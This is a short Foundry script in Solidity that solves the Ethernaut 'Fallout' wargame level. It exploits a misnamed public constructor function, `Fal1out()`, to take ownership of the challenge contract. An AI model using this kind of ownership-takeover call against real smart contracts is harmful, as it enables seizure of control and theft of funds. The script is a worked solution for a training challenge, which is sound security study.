// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { Script } from "forge-std/Script.sol";
import { IFallout } from "ethernaut/02-fallout/IFallout.sol";

contract FalloutScript is Script {
    function run() external payable {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address falloutAddr = vm.envAddress("L02_FALLOUT_ADDRESS");
        IFallout fallout = IFallout(payable(falloutAddr));

        // Step 1: call `Fal1out()` to get the ownership
        // solhint-disable-next-line avoid-low-level-calls
        (bool success,) = address(fallout).call(abi.encodeCall(fallout.Fal1out, ()));

        vm.stopBroadcast();
    }
}
